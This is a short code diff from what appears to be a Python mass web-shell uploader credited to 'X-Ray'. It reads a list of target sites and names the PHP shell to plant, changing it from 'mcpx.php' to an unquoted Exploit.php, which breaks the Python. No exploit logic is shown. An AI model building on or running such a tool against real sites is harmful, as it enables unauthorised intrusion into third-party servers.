@@ -13,8 +13,8 @@ def banner():
          Coded by X-Ray''')
                 
 def main():
-	site = input("\n Enter site list::> ")
-	shell ='mcpx.php'#yourshell.php
+	site = input ("\n Enter site list::> ")
+	shell = Exploit.php #yourshell.php
 	opened = open(site)
 	for x in opened:
 		x = x.strip()
